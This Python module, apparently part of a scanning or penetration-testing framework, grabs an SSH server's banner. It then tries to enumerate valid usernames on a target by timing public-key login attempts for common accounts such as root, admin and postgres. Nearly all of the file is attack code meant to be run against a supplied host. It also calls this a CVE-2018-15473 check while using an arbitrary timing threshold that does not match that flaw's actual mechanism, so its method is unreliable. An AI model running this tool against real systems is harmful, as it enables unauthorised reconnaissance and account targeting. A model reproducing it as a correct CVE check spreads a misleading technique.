import paramiko
import socket
import time
import logging

# Suppress paramiko logging
logging.getLogger("paramiko").setLevel(logging.WARNING)

def get_banner(host, port, logger):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(2)
        sock.connect((host, port))
        banner = sock.recv(1024).decode('utf-8', errors='ignore').strip()
        sock.close()
        logger.info(f"SSH Banner: {banner}")
        return banner
    except Exception as e:
        logger.error(f"Failed to grab banner: {e}")
        return None

def check_cve_2018_15473(host, port, users, logger, db):
    logger.info("Starting CVE-2018-15473 Username Enumeration (Timing Attack)...")
    valid_users = []

    for username in users:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        try:
            sock.connect((host, port))
            transport = paramiko.Transport(sock)
            try:
                transport.start_client()
            except paramiko.SSHException:
                transport.close()
                continue

            start_time = time.time()
            try:
                # Use a random key to attempt auth
                key = paramiko.RSAKey.generate(1024)
                transport.auth_publickey(username, key)
            except paramiko.AuthenticationException:
                # Auth failed, as expected
                pass
            except Exception:
                pass

            elapsed = time.time() - start_time
            transport.close()
            sock.close()

            # Heuristic: Valid users often take longer to reject due to checking authorized_keys
            # This threshold is arbitrary and depends on network latency, but is standard for this CVE check.
            # In a real tool, we might calibrate against a known invalid user.
            logger.info(f"User {username}: {elapsed:.4f}s")

            if elapsed > 0.15: # Very low threshold for local/fast networks, might need adjustment
                 msg = f"Potential valid user (Timing: {elapsed:.4f}s): {username}"
                 logger.warning(msg)
                 valid_users.append(username)

        except Exception as e:
            logger.error(f"Error checking user {username}: {e}")

    if valid_users:
        db.save_finding("SSH", f"{host}:{port}", "CVE-2018-15473 User Enum", valid_users)

    return valid_users

def run(target, logger, db):
    # Parse host/port
    parts = target.split(":")
    host = parts[0]
    port = int(parts[1]) if len(parts) > 1 else 22

    logger.info(f"Starting SSH module on {host}:{port}")

    # 1. Banner Grab
    banner = get_banner(host, port, logger)
    if banner:
        db.save_finding("SSH", f"{host}:{port}", "Banner", banner)

        # Check for vulnerable versions in banner (naive check)
        if "OpenSSH" in banner:
            # Parse version if possible
            # e.g. SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.10
            pass

    # 2. User Enumeration (CVE-2018-15473)
    # We will try a small list of common users if requested, or just root/admin
    common_users = ["root", "admin", "user", "test", "ubuntu", "oracle", "postgres"]
    check_cve_2018_15473(host, port, common_users, logger, db)

    logger.success(f"SSH module finished for {host}:{port}")
